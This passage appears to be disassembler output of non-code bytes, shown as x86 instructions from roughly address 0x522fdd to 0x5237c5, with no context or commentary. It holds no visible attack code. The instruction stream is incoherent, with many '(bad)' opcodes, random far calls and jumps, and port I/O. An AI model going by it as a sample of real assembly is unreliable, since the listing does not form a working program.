  522fdd:	arpl   WORD PTR [ebx],dx
  522fdf:	mov    dl,0xac
  522fe1:	lds    edi,FWORD PTR ds:0x6e33fdf4
  522fe7:	dec    edi
  522fe8:	xor    esi,ecx
  522fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  522feb:	repz les esi,FWORD PTR [esi]
  522fee:	sbb    eax,DWORD PTR [eax-0x554eb085]
  522ff4:	pop    esp
  522ff5:	mov    bh,0xea
  522ff7:	mov    edi,0xcc7be8b7
  522ffc:	mov    bl,0xb2
  522ffe:	iret   
  522fff:	rcl    DWORD PTR [edx+0x3ec1a6b9],cl
  523005:	push   esp
  523006:	call   0xe2ef:0x6e80be64
  52300d:	rcr    DWORD PTR [edx],1
  52300f:	push   ds
  523010:	data16 add al,0x69
  523013:	mov    WORD PTR [edi+ebx*8],gs
  523016:	push   ebx
  523017:	jnp    0x522feb
  523019:	test   al,0x2d
  52301b:	pop    ds
  52301c:	push   ss
  52301d:	pop    ds
  52301e:	std    
  52301f:	mov    ch,0x32
  523021:	ja     0x52309b
  523023:	repz xor eax,0xbda961a2
  523029:	test   DWORD PTR [esi],edx
  52302b:	sub    edi,ebp
  52302d:	shl    cl,0xec
  523030:	lods   al,BYTE PTR ds:[esi]
  523031:	pusha  
  523032:	fcom   QWORD PTR [ebp+0x0]
  523035:	in     al,dx
  523036:	test   eax,0x53d7ada9
  52303b:	nop
  52303c:	mov    eax,ds:0xf3ed6d
  523041:	push   eax
  523042:	(bad)  
  523043:	std    
  523044:	add    bh,BYTE PTR [ecx]
  523046:	pop    esp
  523047:	gs cmp dl,dl
  52304a:	pop    ebx
  52304b:	dec    edx
  52304c:	sub    al,0x91
  52304e:	add    bh,cl
  523050:	aas    
  523051:	mov    cl,0xe1
  523053:	aaa    
  523054:	jp     0x523028
  523056:	stos   WORD PTR es:[edi],ax
  523058:	into   
  523059:	neg    BYTE PTR [esi+0x21626b48]
  52305f:	dec    esi
  523060:	or     al,BYTE PTR [esi+esi*8+0x37]
  523064:	adc    al,0xd2
  523066:	or     eax,0xeed3fdb5
  52306b:	jl     0x52300f
  52306d:	fisttp WORD PTR [eax+0x6d9fb348]
  523073:	mov    gs,WORD PTR [ecx]
  523075:	out    0xf5,al
  523077:	sar    eax,cl
  523079:	jge    0x5230b3
  52307b:	fidivr DWORD PTR [edx+0x43]
  52307e:	les    ebx,FWORD PTR [ebp+0x6c5dcc91]
  523084:	mov    dl,0x7d
  523086:	int    0x54
  523088:	sub    eax,esp
  52308a:	xchg   edi,eax
  52308b:	mov    esp,DWORD PTR [esi-0x7a]
  52308e:	repnz xchg dl,dh
  523091:	xchg   ecx,eax
  523092:	mov    dl,0xa7
  523094:	sub    eax,0x1c9cac6e
  523099:	fadd   DWORD PTR [edx+ecx*8]
  52309c:	aas    
  52309d:	sar    BYTE PTR [eax-0x2c],0x23
  5230a1:	jmp    0x6d539251
  5230a6:	jmp    0xa18969d5
  5230ab:	retf   
  5230ac:	add    DWORD PTR [eax],edx
  5230ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5230af:	xlat   BYTE PTR ds:[ebx]
  5230b0:	out    0x8f,eax
  5230b2:	aaa    
  5230b3:	push   ds
  5230b4:	push   ecx
  5230b5:	popa   
  5230b6:	dec    esi
  5230b7:	imul   esp,DWORD PTR [ebx-0x7a],0xffffffe6
  5230bb:	(bad)  
  5230bd:	mov    al,ds:0xb127327c
  5230c2:	add    DWORD PTR [ebx],edx
  5230c4:	sbb    bh,ch
  5230c6:	jg     0x523116
  5230c8:	icebp  
  5230c9:	jno    0x5230ef
  5230cb:	adc    edi,DWORD PTR [esi+0x2c]
  5230ce:	xchg   esp,eax
  5230cf:	es aaa 
  5230d1:	mov    ebp,0xc3d2a6a2
  5230d6:	push   edi
  5230d7:	lods   eax,DWORD PTR ds:[esi]
  5230d8:	sar    DWORD PTR ds:0xeb15e747,cl
  5230de:	jg     0x52311c
  5230e0:	mov    eax,ds:0xb63f1d0e
  5230e5:	ins    BYTE PTR es:[edi],dx
  5230e6:	idiv   DWORD PTR [esi]
  5230e8:	or     al,0xea
  5230ea:	lods   eax,DWORD PTR ds:[esi]
  5230eb:	inc    eax
  5230ec:	addr16 or dh,ah
  5230ef:	xchg   ebp,eax
  5230f0:	arpl   WORD PTR [edx-0x32],dx
  5230f3:	mov    ds:0xaf1d057b,al
  5230f8:	dec    ebp
  5230f9:	xchg   ebx,eax
  5230fa:	cmp    ah,BYTE PTR [edx-0x343fa448]
  523100:	sub    dh,ah
  523102:	imul   edi,DWORD PTR [ebx-0x9a20e3e],0x820afd65
  52310c:	test   BYTE PTR [edi+ebx*1],0xfa
  523110:	out    dx,eax
  523111:	inc    ebx
  523112:	jne    0x52311b
  523114:	jmp    FWORD PTR [edi]
  523116:	ret    
  523117:	mov    WORD PTR [ebx],es
  523119:	xor    ch,dh
  52311b:	neg    DWORD PTR [ebp+eiz*1+0x72b818e8]
  523122:	jle    0x97a2d83b
  523128:	push   ss
  523129:	call   0xc12d:0x41b94ecf
  523130:	xor    eax,0xf4df1f12
  523135:	mov    es,WORD PTR gs:[edx-0xc]
  523139:	jno    0x5230ce
  52313b:	jo     0x52314e
  52313d:	(bad)  
  52313e:	and    eax,0xc9693689
  523143:	push   edx
  523144:	pop    edx
  523145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  523146:	jmp    0xae13f98f
  52314b:	sbb    esp,esi
  52314d:	pop    esi
  52314e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52314f:	fdivr  QWORD PTR [esi-0x14]
  523152:	cmp    ch,bh
  523154:	jl     0x5231d2
  523156:	in     eax,0x32
  523158:	and    al,0x65
  52315a:	xchg   edi,eax
  52315b:	push   eax
  52315c:	mov    BYTE PTR [esi-0x33a316d0],0x8f
  523163:	icebp  
  523164:	and    DWORD PTR ds:0xf9884efe,edx
  52316a:	push   esp
  52316b:	mov    esi,0x4c6843
  523170:	inc    ebp
  523171:	xlat   BYTE PTR ds:[ebx]
  523172:	cmp    eax,0x669ea7d2
  523177:	mov    ds:0xfdce186c,al
  52317c:	sbb    ebx,DWORD PTR [ecx-0x194922d1]
  523182:	inc    esi
  523183:	pop    es
  523184:	jg     0x5231ff
  523186:	and    edi,DWORD PTR [ecx+eiz*8]
  523189:	sub    BYTE PTR [eax-0x2918812c],cl
  52318f:	and    ebp,0x6b
  523192:	mov    ebx,0x3fb571a5
  523197:	retf   
  523198:	lock mov ecx,DWORD PTR [edi-0x79cf0924]
  52319f:	and    DWORD PTR [ebx+0x5def0d26],0x41
  5231a6:	jae    0x52321c
  5231a8:	ret    0xeee3
  5231ab:	sub    BYTE PTR [ebp+0x1f02e4fb],bl
  5231b1:	cmc    
  5231b2:	test   BYTE PTR [ebx+0x5e],bl
  5231b5:	or     DWORD PTR [esp+ebp*2-0x1d],0xffffff89
  5231ba:	std    
  5231bb:	sbb    al,0x6d
  5231bd:	adc    DWORD PTR [eax+0xd],ebp
  5231c0:	sbb    ebx,edi
  5231c2:	fwait
  5231c3:	jg     0x5231df
  5231c5:	call   0xe93e22cb
  5231ca:	xchg   bh,dh
  5231cc:	mov    ?,WORD PTR [edx-0x2b8e50f0]
  5231d2:	sbb    al,0x55
  5231d4:	mov    ecx,0x7b64e491
  5231d9:	loope  0x5231b1
  5231db:	retf   0xeb35
  5231de:	clc    
  5231df:	xor    BYTE PTR [ebx],0x77
  5231e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5231e3:	cmp    BYTE PTR [edx+0x14],0x65
  5231e7:	shl    BYTE PTR [eax+ebx*2-0x35],0xf0
  5231ec:	aam    0x39
  5231ee:	push   es
  5231ef:	jmp    0xf6508c30
  5231f4:	mov    ah,0x53
  5231f6:	(bad)  
  5231f7:	push   ds
  5231f8:	aas    
  5231f9:	into   
  5231fa:	pop    es
  5231fb:	sub    BYTE PTR [ebp-0x16],dh
  5231fe:	pop    eax
  5231ff:	sub    ch,bl
  523201:	retf   0xf3d4
  523204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  523205:	pop    edi
  523206:	xor    esi,DWORD PTR [eax]
  523208:	nop
  523209:	aaa    
  52320a:	xchg   edi,eax
  52320b:	dec    esi
  52320c:	js     0x523217
  52320e:	ficomp DWORD PTR [eax+0x39b2b33f]
  523214:	mov    ebx,0xdc9175c6
  523219:	adc    DWORD PTR [edx+0x3d],edi
  52321c:	sbb    eax,0x864f8b44
  523221:	retf   0xc132
  523224:	jmp    0x243458af
  523229:	ins    DWORD PTR es:[edi],dx
  52322a:	ret    0x1803
  52322d:	jmp    0x5231bd
  52322f:	push   eax
  523230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  523231:	push   edx
  523232:	sahf   
  523233:	ret    0xf67f
  523236:	pop    ss
  523237:	out    dx,al
  523238:	stc    
  523239:	rcr    BYTE PTR [edx],cl
  52323b:	shr    BYTE PTR [edx-0x60],cl
  52323e:	and    BYTE PTR [eax],bl
  523240:	mov    ch,0xa4
  523242:	push   edx
  523243:	pop    edx
  523244:	push   0x9d94ac9f
  523249:	adc    DWORD PTR [eax+edx*4],eax
  52324c:	push   ecx
  52324d:	int    0x46
  52324f:	pushf  
  523250:	imul   eax,edx,0x3b
  523253:	fld    DWORD PTR [ebx+0x60]
  523256:	mov    ecx,0x1ef51016
  52325b:	xchg   BYTE PTR cs:[ebx-0x52],dh
  52325f:	retf   
  523260:	mov    edi,0x902209eb
  523265:	psubusw mm2,QWORD PTR [esp+eax*2-0x7cec8bb3]
  52326d:	xchg   ebx,eax
  52326e:	cdq    
  52326f:	or     eax,0xc1aa92cb
  523274:	jecxz  0x52324b
  523276:	dec    ebx
  523277:	mov    ecx,0x73f16c86
  52327c:	popa   
  52327d:	sub    eax,0xb5b0ff9
  523282:	pushf  
  523283:	mov    dh,0x83
  523285:	iret   
  523286:	jbe    0x523208
  523288:	dec    esp
  523289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52328a:	mov    bl,0x64
  52328c:	sub    DWORD PTR [eax+0x4ebe7674],ebx
  523292:	prefetch BYTE PTR [ebp+0x2cba169e]
  523299:	inc    ebp
  52329a:	and    ch,BYTE PTR [esi]
  52329c:	hlt    
  52329d:	pop    ss
  52329e:	push   0xffffff87
  5232a0:	cmp    al,0x2b
  5232a2:	push   esp
  5232a3:	les    edx,FWORD PTR [esi-0x16]
  5232a6:	sbb    ah,BYTE PTR [edx-0x69]
  5232a9:	xchg   edi,eax
  5232aa:	adc    eax,0x2f2a8c4
  5232af:	loopne 0x5232b4
  5232b1:	or     eax,0x2c5c99f1
  5232b6:	int3   
  5232b7:	mov    ds:0x1c0c6416,eax
  5232bc:	imul   ebp,DWORD PTR [ebx-0x25],0xffffffff
  5232c0:	pop    edx
  5232c1:	popa   
  5232c2:	jl     0x5232df
  5232c4:	in     al,0x41
  5232c6:	add    edx,ecx
  5232c8:	aam    0x4d
  5232ca:	or     eax,0x246c0fa5
  5232cf:	aaa    
  5232d0:	neg    BYTE PTR [edx+0x32]
  5232d3:	pop    ebx
  5232d4:	fs retf 
  5232d6:	les    ebp,FWORD PTR [edi]
  5232d8:	popf   
  5232d9:	xchg   ecx,eax
  5232da:	leave  
  5232db:	ret    0x5661
  5232de:	cwde   
  5232df:	scas   eax,DWORD PTR es:[edi]
  5232e0:	add    eax,0x9325eeec
  5232e5:	ins    DWORD PTR es:[edi],dx
  5232e6:	push   ds
  5232e7:	mov    cl,0xc3
  5232e9:	int3   
  5232ea:	sbb    ch,dl
  5232ec:	jne    0x5232e7
  5232ee:	mov    ah,0xca
  5232f0:	mov    al,0x36
  5232f2:	mov    ds:0x95768404,eax
  5232f7:	out    0x8a,al
  5232f9:	xor    ebp,DWORD PTR [esi+ebx*1-0x33]
  5232fd:	jl     0x523314
  5232ff:	mov    ?,WORD PTR [ecx+esi*1]
  523302:	sub    dl,BYTE PTR [ebp+0x57f56076]
  523308:	popf   
  523309:	lea    eax,[ebx+0x2c056e9b]
  52330f:	mov    ds:0x84be56f7,eax
  523314:	aad    0x6e
  523316:	call   0xa008:0x4bf6d90a
  52331d:	or     bl,BYTE PTR [eax]
  52331f:	in     al,0xce
  523321:	and    BYTE PTR [ecx],bl
  523323:	push   ebp
  523324:	or     eax,0x665e96d4
  523329:	mov    esp,DWORD PTR [ebp-0x6b6a4bcd]
  52332f:	add    ah,BYTE PTR [ebx]
  523331:	cmp    eax,0x595b5ee3
  523336:	jno    0x52339c
  523338:	jl     0x5232ff
  52333a:	xchg   edi,eax
  52333b:	and    BYTE PTR [ecx],ch
  52333d:	mov    ds:0x4be79bd7,eax
  523342:	aam    0x9d
  523344:	dec    edi
  523345:	sbb    edx,DWORD PTR [edx+0xf75f853]
  52334b:	loopne 0x5232ff
  52334d:	sub    cl,BYTE PTR [esi-0xcacad1f]
  523353:	adc    al,0xd4
  523355:	(bad)
  523358:	pop    ss
  523359:	es scas eax,DWORD PTR es:[edi]
  52335b:	sub    ch,BYTE PTR [esi+0x56b9dfc]
  523361:	sahf   
  523362:	stc    
  523363:	jo     0x5233a6
  523365:	push   es
  523366:	pop    ss
  523367:	out    dx,al
  523368:	or     eax,0x6436cff7
  52336d:	pop    edi
  52336e:	xlat   BYTE PTR ds:[ebx]
  52336f:	(bad)  
  523370:	xor    bl,BYTE PTR [edx+0x4e5acd43]
  523376:	cmp    ebp,edx
  523378:	inc    eax
  523379:	sbb    BYTE PTR [ebp-0x4ba121a1],cl
  52337f:	rcl    DWORD PTR [eax],cl
  523381:	(bad)  
  523382:	cmp    dh,BYTE PTR [ebp+0x2a1d82ad]
  523388:	xchg   edi,eax
  523389:	fcomp  DWORD PTR [edx+0x5d]
  52338c:	and    ah,dl
  52338e:	test   al,0xad
  523390:	pop    ds
  523391:	cmp    dl,BYTE PTR [ebp+0x65]
  523394:	jb     0x5233bb
  523396:	sbb    esi,DWORD PTR [eax-0x44]
  523399:	aam    0x6a
  52339b:	(bad)  
  52339c:	jl     0x52341a
  52339e:	es (bad) 
  5233a0:	hlt    
  5233a1:	and    BYTE PTR [edx],bh
  5233a3:	mov    cl,0xb8
  5233a5:	mov    ch,0xd0
  5233a7:	test   ecx,edi
  5233a9:	adc    edi,DWORD PTR [eax+0x2db1a777]
  5233af:	cmp    bl,BYTE PTR [ecx-0x1abf8cfa]
  5233b5:	imul   esp,DWORD PTR [edi-0x1c80751a],0x7893936d
  5233bf:	test   DWORD PTR [ebp+0x45],edx
  5233c2:	and    eax,0x5eda276f
  5233c7:	std    
  5233c8:	aas    
  5233c9:	call   0x45d3:0x75f0c60c
  5233d0:	or     BYTE PTR [eax-0x26],0xb
  5233d4:	push   ds
  5233d5:	sub    al,0xa7
  5233d7:	bound  ebp,QWORD PTR ds:0x1a75cbc4
  5233dd:	xchg   ebp,eax
  5233de:	std    
  5233df:	(bad)  
  5233e1:	outs   dx,BYTE PTR ds:[esi]
  5233e2:	jp     0x5233fd
  5233e4:	aas    
  5233e5:	(bad)  
  5233e6:	stos   BYTE PTR es:[edi],al
  5233e7:	push   ebx
  5233e8:	rcr    DWORD PTR [eax-0xa],0x42
  5233ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5233ed:	pop    ebp
  5233ee:	mov    bh,0x23
  5233f0:	rcr    BYTE PTR [ecx-0x1233a372],0x7c
  5233f7:	shl    BYTE PTR [eax+0x4f],0xda
  5233fb:	addr16 repz leave 
  5233fe:	lds    ebp,FWORD PTR [edx]
  523400:	inc    esp
  523401:	jmp    0x9091:0x114c123a
  523408:	pop    es
  523409:	daa    
  52340a:	inc    edx
  52340b:	test   cl,0x9d
  52340e:	imul   edx,eax,0x46ffbab8
  523414:	pop    ebp
  523415:	mov    ebp,0x5e8f820b
  52341a:	aad    0xc4
  52341c:	sub    edx,DWORD PTR [eax]
  52341e:	cwde   
  52341f:	jns    0x52346d
  523421:	mov    ch,0x98
  523423:	adc    al,0xaf
  523425:	jge    0x52342c
  523427:	scas   eax,DWORD PTR es:[edi]
  523428:	lods   al,BYTE PTR ds:[esi]
  523429:	pop    ebp
  52342a:	enter  0x3359,0xaa
  52342e:	xchg   ebp,eax
  52342f:	pop    eax
  523430:	sbb    cl,BYTE PTR [ebp+0x0]
  523433:	jge    0x5234a9
  523435:	mov    ebp,0x4abb2a8b
  52343a:	dec    ebp
  52343b:	and    eax,0x56528f09
  523440:	sbb    ch,BYTE PTR [ecx-0x3248fd67]
  523446:	cwde   
  523447:	push   edx
  523448:	or     eax,0x90ad5cd7
  52344d:	rcl    BYTE PTR [ebx],1
  52344f:	jmp    0x1da5511c
  523454:	jp     0x52343b
  523456:	mov    edx,ebp
  523458:	add    ebp,esp
  52345a:	adc    edx,DWORD PTR [esi]
  52345c:	out    0x14,al
  52345e:	dec    ebp
  52345f:	cmp    eax,DWORD PTR [ebx]
  523461:	add    BYTE PTR [edx-0x1d],0xf7
  523465:	cmp    DWORD PTR [esi+0x9],0xd366e9e3
  52346c:	jl     0x52349c
  52346e:	jae    0x52343a
  523470:	jo     0x523491
  523472:	std    
  523473:	cmp    eax,0xc82b7fdb
  523478:	nop
  523479:	push   0xffffffb4
  52347b:	data16 daa 
  52347d:	fstp   TBYTE PTR [ecx+0x22]
  523480:	repnz in eax,0x49
  523483:	leave  
  523484:	cmp    eax,0x5028ddbe
  523489:	push   0xffffffcd
  52348b:	aas    
  52348c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52348d:	mov    ds:0x3e04b186,eax
  523492:	mov    al,ds:0x73be704f
  523497:	ror    bl,0x68
  52349a:	push   esp
  52349b:	js     0x5234ba
  52349d:	xchg   edx,eax
  52349e:	(bad)  
  5234a0:	(bad)  
  5234a2:	or     bh,dl
  5234a4:	fbld   TBYTE PTR [eax]
  5234a6:	sbb    esi,DWORD PTR [esp+ecx*8-0x30]
  5234aa:	fidiv  DWORD PTR [edi*2+0x27574a56]
  5234b1:	ds jno 0x52346c
  5234b4:	test   dh,0x59
  5234b7:	js     0x52348d
  5234b9:	fld    DWORD PTR [edi+0x330d5219]
  5234bf:	ss repnz dec ecx
  5234c2:	lds    ecx,FWORD PTR [ebp+0x67adb75e]
  5234c8:	shl    bl,0x75
  5234cb:	or     BYTE PTR [eax+ebx*8+0x5654c5e9],ch
  5234d2:	xor    esp,DWORD PTR [eax+eiz*1-0x8]
  5234d6:	sar    bh,1
  5234d8:	outs   dx,DWORD PTR ds:[esi]
  5234d9:	scas   eax,DWORD PTR es:[edi]
  5234da:	sbb    al,0x71
  5234dc:	add    ch,BYTE PTR [eax]
  5234de:	mov    dh,0x50
  5234e0:	inc    ebx
  5234e1:	and    ch,ah
  5234e3:	cdq    
  5234e4:	xor    eax,0xf5daffa8
  5234e9:	in     al,dx
  5234ea:	add    eax,DWORD PTR ds:0xf65d81d
  5234f0:	xchg   edi,eax
  5234f1:	inc    ebx
  5234f2:	call   0x5e40:0xe71abea5
  5234f9:	fnsave [ecx]
  5234fb:	inc    ebp
  5234fc:	push   ss
  5234fd:	out    dx,al
  5234fe:	inc    edx
  5234ff:	test   BYTE PTR [ebp-0x760812d2],dh
  523505:	arpl   WORD PTR [ecx+edx*4-0x8],di
  523509:	leave  
  52350a:	cld    
  52350b:	mov    dh,0xc3
  52350d:	pushf  
  52350e:	les    edi,FWORD PTR [edx+0x2ae9b1e9]
  523514:	jnp    0x5234b9
  523516:	sbb    al,0xba
  523518:	js     0x5234e7
  52351a:	sar    ecx,cl
  52351c:	adc    BYTE PTR [ebp+eax*8+0x20182fc1],ch
  523523:	(bad)  
  523525:	add    eax,0x8d4737d8
  52352a:	push   es
  52352b:	clc    
  52352c:	pop    edx
  52352d:	retf   0xd3a9
  523530:	mov    edi,0x6f8a3c70
  523535:	dec    edx
  523536:	inc    edi
  523537:	add    edi,DWORD PTR [ecx+0x62fcc9d4]
  52353d:	sbb    DWORD PTR [edx],ebp
  52353f:	xor    ecx,DWORD PTR [edi+0x6]
  523542:	adc    al,BYTE PTR [ebx]
  523544:	inc    edi
  523545:	sub    BYTE PTR [ecx-0xc9634bd],bl
  52354b:	adc    eax,0xa3203bdf
  523550:	int3   
  523551:	nop
  523552:	and    ch,0x50
  523555:	leave  
  523556:	and    ebp,DWORD PTR [edx]
  523558:	xchg   BYTE PTR [edi],dh
  52355a:	sti    
  52355b:	xor    ebp,esp
  52355d:	ret    
  52355e:	aas    
  52355f:	mov    bl,0x3d
  523561:	dec    edx
  523562:	inc    esp
  523563:	bound  esi,QWORD PTR [ebx-0x1]
  523566:	lds    edi,FWORD PTR [eax]
  523568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  523569:	sbb    cl,al
  52356b:	out    0xa9,al
  52356d:	mov    ?,WORD PTR [ebx]
  52356f:	out    0xe8,al
  523571:	icebp  
  523572:	mov    esi,0x9d7e4dc
  523577:	jmp    0x52354b
  523579:	dec    ebx
  52357a:	js     0x52353b
  52357c:	scas   eax,DWORD PTR es:[edi]
  52357d:	std    
  52357e:	xor    bl,bl
  523580:	icebp  
  523581:	jge    0x52356d
  523583:	and    BYTE PTR [esi+ecx*8+0x29f3bf47],0x90
  52358b:	sub    esp,esp
  52358d:	adc    BYTE PTR es:[ebp-0xf2289e4],al
  523594:	jle    0x5235a2
  523596:	(bad)  
  523597:	jns    0x5235de
  523599:	icebp  
  52359a:	adc    ebx,ebx
  52359c:	mov    ebp,0x7e55fd9b
  5235a1:	fwait
  5235a2:	or     al,BYTE PTR [ebp-0x16]
  5235a5:	inc    edi
  5235a6:	je     0x5235b5
  5235a8:	stos   DWORD PTR es:[edi],eax
  5235a9:	push   edi
  5235aa:	(bad)  
  5235ab:	loopne 0x52359a
  5235ad:	push   edx
  5235ae:	jo     0x523617
  5235b0:	or     al,0xa0
  5235b2:	idiv   bh
  5235b4:	ret    
  5235b5:	dec    esi
  5235b6:	cmp    ch,BYTE PTR [edx]
  5235b8:	pop    edi
  5235b9:	ins    BYTE PTR es:[edi],dx
  5235ba:	out    dx,al
  5235bb:	scas   eax,DWORD PTR es:[edi]
  5235bc:	push   ecx
  5235bd:	cmp    eax,0xeca03069
  5235c2:	and    al,0x18
  5235c4:	dec    ebp
  5235c5:	icebp  
  5235c6:	fisttp WORD PTR [eax+0x7]
  5235c9:	call   0x4ed140e1
  5235ce:	jl     0x52362f
  5235d0:	push   edx
  5235d1:	fdivp  st(7),st
  5235d3:	hlt    
  5235d4:	out    0x22,al
  5235d6:	mov    ebx,0x2963978
  5235db:	inc    edx
  5235dc:	mov    bh,0x92
  5235de:	sub    eax,esp
  5235e0:	call   0xb441a1ea
  5235e5:	jmp    0x1ad3:0x4d5dbb9e
  5235ec:	mov    ch,0x4a
  5235ee:	inc    edi
  5235ef:	cdq    
  5235f0:	or     DWORD PTR [eax-0x3c5a9e5e],esp
  5235f6:	mov    cl,0x9f
  5235f8:	jno    0x5235cf
  5235fa:	test   DWORD PTR [esi+0x67],esi
  5235fd:	mov    al,0x66
  5235ff:	cs in  al,0x3c
  523602:	inc    eax
  523603:	cmp    ebx,DWORD PTR [ebx+0x52]
  523606:	adc    al,0x94
  523608:	imul   ecx,DWORD PTR [ebx-0x7e975d12],0x77
  52360f:	jne    0x5235f8
  523611:	xor    DWORD PTR [edi+esi*1+0x424e05a9],edx
  523618:	sub    WORD PTR [ecx-0x6b2bac5b],dx
  52361f:	dec    esi
  523620:	mov    DWORD PTR [ecx-0x29],esi
  523623:	xchg   BYTE PTR [ebx+0x746d6bd8],ah
  523629:	das    
  52362a:	add    eax,0xf90b141b
  52362f:	gs push edi
  523631:	cmp    BYTE PTR [edx],dl
  523633:	nop
  523634:	mov    es,WORD PTR [edx]
  523636:	jp     0x5236ac
  523638:	mov    cl,BYTE PTR [ecx]
  52363a:	cld    
  52363b:	jmp    0x9a4d:0x2a47085f
  523642:	or     BYTE PTR [edi-0x4f732ae7],ch
  523648:	mov    edi,0x99ccc15
  52364d:	cmp    al,0x14
  52364f:	jb     0x523649
  523651:	pop    edi
  523652:	ins    BYTE PTR es:[edi],dx
  523653:	push   ds
  523654:	mov    esp,0x6398c09
  523659:	mov    ds:0xb50afb65,eax
  52365e:	xchg   ebp,eax
  52365f:	xchg   edx,ebp
  523661:	xor    BYTE PTR [ecx],bl
  523663:	int    0xb0
  523665:	popa   
  523666:	or     esp,esp
  523668:	out    0xe2,eax
  52366a:	adc    edi,DWORD PTR [esi+0x3b]
  52366d:	scas   al,BYTE PTR es:[edi]
  52366e:	test   dh,0xd1
  523671:	mov    ebp,0x494c7451
  523676:	xchg   esi,eax
  523677:	retf   
  523678:	mov    ah,0x2b
  52367a:	aam    0xf7
  52367c:	retf   0x5b32
  52367f:	inc    edx
  523680:	fdivr  QWORD PTR [edx-0x54]
  523683:	and    al,0x1b
  523685:	dec    edx
  523686:	aad    0xcc
  523688:	push   esp
  523689:	cmp    al,0xfe
  52368b:	neg    DWORD PTR [ebp+ebp*8+0x55950093]
  523692:	dec    ebx
  523693:	push   eax
  523694:	call   0xcc4b2609
  523699:	jmp    0x523650
  52369b:	xchg   ebx,eax
  52369c:	jne    0x523706
  52369e:	fld    TBYTE PTR [eax]
  5236a0:	jmp    0x523700
  5236a2:	lods   al,BYTE PTR ss:[esi]
  5236a4:	aas    
  5236a5:	pop    ds
  5236a6:	inc    ecx
  5236a7:	int3   
  5236a8:	jl     0x5236e5
  5236aa:	pop    ebx
  5236ab:	or     edi,DWORD PTR [eax]
  5236ad:	mov    esp,0x8347e524
  5236b2:	sbb    BYTE PTR es:[ebx-0x31],dh
  5236b6:	test   al,0x23
  5236b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5236b9:	in     al,dx
  5236ba:	xor    ch,dl
  5236bc:	xor    bh,BYTE PTR [ebp-0x65fab259]
  5236c2:	mov    ds:0x63643998,eax
  5236c7:	fisubr WORD PTR [ecx+0x57ee5347]
  5236cd:	daa    
  5236ce:	push   0xec242470
  5236d3:	ins    DWORD PTR es:[edi],dx
  5236d4:	adc    eax,0x6b2186f4
  5236d9:	sub    ah,0x8f
  5236dc:	out    0xcc,eax
  5236de:	nop    DWORD PTR [edx-0x708d162d]
  5236e5:	call   0xe481:0xbeb861ea
  5236ec:	mov    esp,DWORD PTR [esi+0x24]
  5236ef:	(bad)  
  5236f0:	pop    edi
  5236f1:	xchg   edi,eax
  5236f2:	nop
  5236f3:	ret    0xc922
  5236f6:	and    al,dl
  5236f8:	xchg   ecx,eax
  5236f9:	jb     0x523722
  5236fb:	aas    
  5236fc:	cdq    
  5236fd:	imul   ebx,DWORD PTR [edx-0x66],0x56
  523701:	xchg   esi,eax
  523702:	mov    ebx,0x39126179
  523707:	cmc    
  523708:	repnz ins BYTE PTR es:[edi],dx
  52370a:	xor    al,0x45
  52370c:	fadd   DWORD PTR [ebx+0x1d]
  52370f:	aam    0x2e
  523711:	dec    esp
  523712:	xlat   BYTE PTR ds:[ebx]
  523713:	lds    edi,FWORD PTR [eax+edx*4+0x4d929bb1]
  52371a:	jp     0x523717
  52371c:	lods   al,BYTE PTR ds:[esi]
  52371d:	add    BYTE PTR [ebx+0x19],al
  523720:	mov    bh,0xbd
  523722:	std    
  523723:	fstp   DWORD PTR [esi]
  523725:	out    dx,eax
  523726:	xchg   BYTE PTR [esi-0x78],dh
  523729:	cdq    
  52372a:	mov    al,ds:0x6f6119d7
  52372f:	call   0xfd7b:0x301603a8
  523736:	aas    
  523737:	sbb    ah,ah
  523739:	inc    esi
  52373a:	pop    ds
  52373b:	je     0x52374e
  52373d:	mov    cl,0x11
  52373f:	inc    eax
  523740:	jmp    0x2c26:0x4d24114
  523747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  523748:	mov    BYTE PTR [ebx],al
  52374a:	cld    
  52374b:	cli    
  52374c:	shr    BYTE PTR [edx+0x54],1
  52374f:	scas   eax,DWORD PTR es:[edi]
  523750:	test   DWORD PTR [ebp-0x57],eax
  523753:	cmp    BYTE PTR [edx+0x44],0xea
  523757:	mov    edi,0xa3294876
  52375c:	dec    ecx
  52375d:	adc    ah,BYTE PTR [esi+0x46]
  523760:	push   esi
  523761:	mov    dh,0xe5
  523763:	jge    0x52376b
  523765:	jae    0x52373d
  523767:	in     al,0x2a
  523769:	out    0xb1,al
  52376b:	lods   al,BYTE PTR ds:[esi]
  52376c:	fdivr  QWORD PTR [ecx]
  52376e:	mov    DWORD PTR [esi-0x1eea7ada],0xaf47a77a
  523778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  523779:	rol    BYTE PTR [bp+di-0x6],cl
  52377d:	xor    al,0xb8
  52377f:	loop   0x52371b
  523781:	aad    0x50
  523783:	std    
  523784:	lods   al,BYTE PTR ds:[esi]
  523785:	bound  esi,QWORD PTR [ecx-0x7e719a55]
  52378b:	and    eax,0x82229290
  523790:	add    bh,dh
  523792:	(bad)  
  523793:	mov    al,ds:0x4d2d0af7
  523798:	fld    TBYTE PTR [esi]
  52379a:	xchg   BYTE PTR [ebp-0x3c699675],ch
  5237a0:	(bad)
  5237a4:	sbb    eax,DWORD PTR [ecx+0x7]
  5237a7:	sbb    al,0xf7
  5237a9:	mov    eax,0x5b6982e1
  5237ae:	jb     0x5237a5
  5237b0:	xchg   esi,eax
  5237b1:	jno    0x52382b
  5237b3:	scas   al,BYTE PTR es:[edi]
  5237b4:	pop    esi
  5237b5:	push   ebp
  5237b6:	jp     0x523799
  5237b8:	stos   BYTE PTR es:[edi],al
  5237b9:	push   esp
  5237ba:	pop    esi
  5237bb:	adc    al,0x18
  5237bd:	loop   0x5237db
  5237bf:	mov    ebx,ebx
  5237c1:	sti    
  5237c2:	sbb    BYTE PTR cs:[ecx],dh
  5237c5:	push   eax
